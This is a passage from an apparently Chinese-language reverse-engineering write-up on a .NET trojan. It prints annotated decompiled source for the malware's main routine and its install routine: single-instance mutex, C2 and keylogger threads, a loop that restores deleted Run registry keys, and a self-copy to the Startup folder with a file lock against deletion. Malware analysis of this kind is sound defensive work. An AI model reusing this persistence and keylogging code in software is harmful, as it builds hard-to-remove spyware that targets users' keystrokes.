style="--0:#BD976A;--1:#B07D48">CurrentUser</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GetValue</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">sf</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\\</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">RG</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#666666;--1:#999999">),</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\"</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LO</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">FullName</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\"</span><span style="--0:#C98A7D;--1:#B56959"> ..</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">))</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">F</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Registry</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">CurrentUser</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">OpenSubKey</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">sf</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">true</span><span style="--0:#666666;--1:#999999">).</span><span style="--0:#80A665;--1:#59873A">SetValue</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">RG</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\"</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LO</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">FullName</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\"</span><span style="--0:#C98A7D;--1:#B56959"> ..</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex5</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#758575DD;--1:#A0ADA0">// 检查HKLM自启项：被删除/修改则重新写入（高权限尝试）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Operators</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ConditionalCompareObjectNotEqual</span><span style="--0:#666666;--1:#999999">(</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">F</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Registry</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LocalMachine</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GetValue</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">sf</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\\</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">RG</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#666666;--1:#999999">),</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\"</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LO</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">FullName</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\"</span><span style="--0:#C98A7D;--1:#B56959"> ..</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">))</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">F</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Registry</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LocalMachine</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">OpenSubKey</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">sf</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">true</span><span style="--0:#666666;--1:#999999">).</span><span style="--0:#80A665;--1:#59873A">SetValue</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">RG</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\"</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LO</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">FullName</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\"</span><span style="--0:#C98A7D;--1:#B56959"> ..</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex6</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex7</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#758575DD;--1:#A0ADA0">// 守护循环异常不终止：静默捕获，保证恶意程序持续运行</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span style="--0:#666666;--1:#999999">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="public static void ko(){    // ========== 第一步：命令行参数检测+注册表标记 ==========    if (Interaction.Command() != null) // 检测是否有命令行启动参数（如静默启动/更新）    {        try        {            // 写入注册表标记&#x22;di&#x22;=&#x22;!&#x22;：标记程序通过命令行启动，用于后续逻辑判断            OK.F.Registry.CurrentUser.SetValue(&#x22;di&#x22;, &#x22;!&#x22;);        }        catch (Exception ex)        {            // 静默捕获，不暴露启动参数处理失败        }        Thread.Sleep(5000); // 延迟5秒：规避安全软件对“命令行启动后快速执行”的检测    }    // ========== 第二步：单实例运行（防多开暴露） ==========    bool isFirstInstance = false;    // 创建互斥体（Mutex）：以OK.RG为唯一标识，确保仅一个恶意进程运行    OK.MT = new Mutex(true, OK.RG, ref isFirstInstance);    if (!isFirstInstance) // 已有实例运行→直接退出，避免多进程暴露    {        ProjectData.EndApp();    }    // ========== 第三步：启动持久化+自保护模块（INS） ==========    OK.INS(); // 调用之前分析的INS函数：完成文件自复制、防火墙白名单、注册表/启动文件夹自启    // ========== 第四步：初始化恶意程序路径参数 ==========    if (!OK.Idr)    {        OK.EXE = OK.LO.Name;    // 重置恶意程序文件名        OK.DR = OK.LO.Directory.Name; // 重置恶意程序所在目录    }    // ========== 第五步：启动C2通信线程（RC） ==========    // 新建线程启动RC函数（C2通信循环），栈大小1MB：降低资源占用，避免主线程阻塞    Thread thread = new Thread(new ThreadStart(OK.RC), 1);    thread.Start();    // ========== 第六步：启动键盘记录线程（WRK） ==========    try    {        OK.kq = new kl(); // 实例化键盘记录类（kl）        thread = new Thread(new ThreadStart(OK.kq.WRK), 1); // 启动WRK键盘记录函数        thread.Start();    }    catch (Exception ex2)    {        // 键盘记录启动失败不影响主流程：静默捕获，保证C2通信等核心功能运行    }    // ========== 第七步：系统事件监听（关机/注销收尾） ==========    int num = 0;    string lastActState = &#x22;&#x22;;    if (OK.BD) // OK.BD为true时，监听系统会话结束事件    {        try        {            // 注册SessionEnding事件（用户注销/系统关机）：触发时调用OK.ED()收尾（清理痕迹）            SystemEvents.SessionEnding += delegate(object a0, SessionEndingEventArgs a1)            {                OK.ED();            };            OK.pr(1); // 调整进程优先级（1=低优先级）：降低CPU占用，规避检测        }        catch (Exception ex3)        {        }    }    // ========== 第八步：核心守护循环（无限运行，维护恶意状态） ==========    checked    {        for (;;) // 无限循环：持续守护，直到进程被终止        {            Thread.Sleep(1000); // 1秒延迟：极低CPU占用，用户/安全软件无感知            if (!OK.Cn) lastActState = &#x22;&#x22;; // C2断开时重置状态标记            Application.DoEvents(); // 处理消息循环，避免程序假死            try            {                num++;                // 每5次循环：调整进程最小工作集，降低内存占用                if (num == 5)                {                    try                    {                        // 限制进程最小工作集为1024字节：减少内存占用，规避“高内存可疑进程”检测                        Process.GetCurrentProcess().MinWorkingSet = (IntPtr)1024;                    }                    catch (Exception ex4)                    {                    }                }                // 每8次循环：检测系统激活状态，变化则上报C2                if (num >= 8)                {                    num = 0;                    string currentActState = OK.ACT(); // 获取系统激活状态/恶意程序运行状态                    if (Operators.CompareString(lastActState, currentActState, false) != 0)                    {                        lastActState = currentActState;                        OK.Send(&#x22;act&#x22; + OK.Y + currentActState); // 向C2上报状态变化                    }                }                // 自修复：检查注册表自启项，被修改则重新写入（保证持久化不失效）                if (OK.Isu)                {                    try                    {                        // 检查HKCU自启项：被删除/修改则重新写入                        if (Operators.ConditionalCompareObjectNotEqual(                            OK.F.Registry.CurrentUser.GetValue(OK.sf + &#x22;\\&#x22; + OK.RG, &#x22;&#x22;),                            &#x22;\&#x22;&#x22; + OK.LO.FullName + &#x22;\&#x22; ..&#x22;, false))                        {                            OK.F.Registry.CurrentUser.OpenSubKey(OK.sf, true).SetValue(OK.RG, &#x22;\&#x22;&#x22; + OK.LO.FullName + &#x22;\&#x22; ..&#x22;);                        }                    }                    catch (Exception ex5)                    {                    }                    try                    {                        // 检查HKLM自启项：被删除/修改则重新写入（高权限尝试）                        if (Operators.ConditionalCompareObjectNotEqual(                            OK.F.Registry.LocalMachine.GetValue(OK.sf + &#x22;\\&#x22; + OK.RG, &#x22;&#x22;),                            &#x22;\&#x22;&#x22; + OK.LO.FullName + &#x22;\&#x22; ..&#x22;, false))                        {                            OK.F.Registry.LocalMachine.OpenSubKey(OK.sf, true).SetValue(OK.RG, &#x22;\&#x22;&#x22; + OK.LO.FullName + &#x22;\&#x22; ..&#x22;);                        }                    }                    catch (Exception ex6)                    {                    }                }            }            catch (Exception ex7)            {                // 守护循环异常不终止：静默捕获，保证恶意程序持续运行            }        }    }}"><div></div></button></div></figure></div>
<p>根据逆向分析，<code>ko()</code> 的执行流程如下：</p>
<ol>
<li>
<p><strong>单实例互斥检测</strong>:</p>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c#"><code><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">// 创建互斥体，防止多个木马实例同时运行暴露</span></div></div><div class="ec-line"><div class="code"><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">MT</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">Mutex</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4D9375;--1:#1E754F">true</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">RG</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">ref</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">isFirstInstance</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">!</span><span style="--0:#BD976A;--1:#B07D48">isFirstInstance</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">ProjectData</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">EndApp</span><span style="--0:#666666;--1:#999999">();</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="// 创建互斥体，防止多个木马实例同时运行暴露OK.MT = new Mutex(true, OK.RG, ref isFirstInstance);if (!isFirstInstance) ProjectData.EndApp();"><div></div></button></div></figure></div>
</li>
<li>
<p><strong>调用安装模块 (INS)</strong>: 调用 <code>OK.INS()</code> 函数（详见后文），完成文件搬运、隐藏和注册表持久化设置。</p>
</li>
<li>
<p><strong>启动多线程任务</strong>: <code>ko()</code> 并不直接执行恶意行为，而是创建多个线程并行工作，避免主程序卡死：</p>
<ul>
<li><strong>C2 通信线程</strong>: <code>new Thread(new ThreadStart(OK.RC))</code> —— 负责连接服务器接收指令。</li>
<li><strong>键盘记录线程</strong>: <code>new Thread(new ThreadStart(OK.kq.WRK))</code> —— 负责后台记录按键。</li>
</ul>
</li>
<li>
<p><strong>无限守护循环</strong>: 这是 <code>ko()</code> 函数最后也是最关键的部分。它进入一个 <code>for(;;)</code> 死循环，充当“守护进程”：</p>
<ul>
<li><strong>心跳休眠</strong>: <code>Thread.Sleep(1000)</code>，降低 CPU 占用。</li>
<li><strong>内存优化</strong>: 定期调整 <code>MinWorkingSet</code>，减少内存占用以隐藏踪迹。</li>
<li><strong>注册表守护</strong>: 它会不断检测注册表自启项 <code>HKCU\...\Run</code>。如果用户或杀软删除了该启动项，<code>ko()</code> 会立即<strong>重新写入</strong>，实现“删不掉”的顽固效果。</li>
</ul>
</li>
</ol>
<h2 id="第四阶段后门模块展开-payload">第四阶段：后门模块展开 (Payload)<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 第四阶段：后门模块展开 (Payload)" data-pagefind-ignore="" href="#第四阶段后门模块展开-payload">#</a></h2>
<h3 id="1-持久化与隐藏ins-函数">1. 持久化与隐藏：INS() 函数<a class="header-anchor" tab-index="0" aria-hidden="false" aria-label="Link to 1. 持久化与隐藏：INS() 函数" data-pagefind-ignore="" href="#1-持久化与隐藏ins-函数">#</a></h3>
<p>由 <code>ko()</code> 在初始化阶段调用。</p>
<ul>
<li><strong>自我复制</strong>: 将自身从显眼的“启动目录”复制到更隐蔽的系统目录（如 <code>%AppData%</code>）。</li>
</ul>
<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="c#"><code><div class="ec-line"><div class="code"><span style="--0:#758575DD;--1:#A0ADA0">// 双重持久化：复制到系统启动文件夹（OK.IsF为true时执行）</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">IsF</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// Environment.GetFolderPath(7)：对应「启动文件夹」（Environment.SpecialFolder.Startup 的枚举值为7）</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// 复制恶意程序到启动文件夹，覆盖已有文件，命名为OK.RG.exe</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">File</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Copy</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">LO</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">FullName</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Environment</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GetFolderPath</span><span style="--0:#666666;--1:#999999">((</span><span style="--0:#5DA994;--1:#2E8F82">Environment</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#5DA994;--1:#2E8F82">SpecialFolder</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#4C9A91;--1:#2F798A">7</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\\</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">RG</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">.exe</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">true</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// 打开文件流（3=FileMode.Open）：占用文件，防止被安全软件删除（自保护）</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">FS</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">FileStream</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">Environment</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">GetFolderPath</span><span style="--0:#666666;--1:#999999">((</span><span style="--0:#5DA994;--1:#2E8F82">Environment</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#5DA994;--1:#2E8F82">SpecialFolder</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#4C9A91;--1:#2F798A">7</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C99076;--1:#A65E2B">\\</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">RG</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">.exe</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">FileMode</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Open</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="// 双重持久化：复制到系统启动文件夹（OK.IsF为true时执行）    if (OK.IsF)    {        try        {            // Environment.GetFolderPath(7)：对应「启动文件夹」（Environment.SpecialFolder.Startup 的枚举值为7）            // 复制恶意程序到启动文件夹，覆盖已有文件，命名为OK.RG.exe            File.Copy(OK.LO.FullName, Environment.GetFolderPath((Environment.SpecialFolder)7) + &#x22;\\&#x22; + OK.RG + &#x22;.exe&#x22;, true);            // 打开文件流（3=FileMode.Open）：占用文件，防止被安全软件删除（自保护）            OK.FS = new FileStream(Environment.GetFolderPath((Environment.SpecialFolder)7) + &#x22;\\&#x22; + OK.RG + &#x22;.exe&#x22;, FileMode.Open);        }    }"><div></div></button></div></figure></div>
<ul>
<li>
<p><strong>注册表操作</strong>:</p>
